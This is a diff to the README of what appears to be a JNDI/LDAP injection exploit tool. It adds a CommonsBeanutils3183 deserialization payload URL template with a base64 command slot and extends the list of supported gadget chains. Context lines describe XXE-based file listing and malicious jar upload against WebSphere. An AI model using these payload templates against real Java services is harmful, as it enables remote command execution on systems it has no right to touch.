@@ -74,6 +74,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/Click1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/AspectJWeaver/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3183/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/BeanShell1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]
@@ -151,6 +152,15 @@ Supported LADP Queries：
   * ```Jre8u20```
   * ```CVE_2020_2551```
   * ```CVE_2020_2883```
+  *```AspectJWeaver```
+  *```BeanShell1```
+  *```C3P092```
+  *```Click1```
+  *```Clojure```
+  *```CommonsBeanutils2NOCC```
+  *```CommonsBeanutils3```
+  *```CommonsBeanutils3183```
+  *```CommonsBeanutils1183NOCC```
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
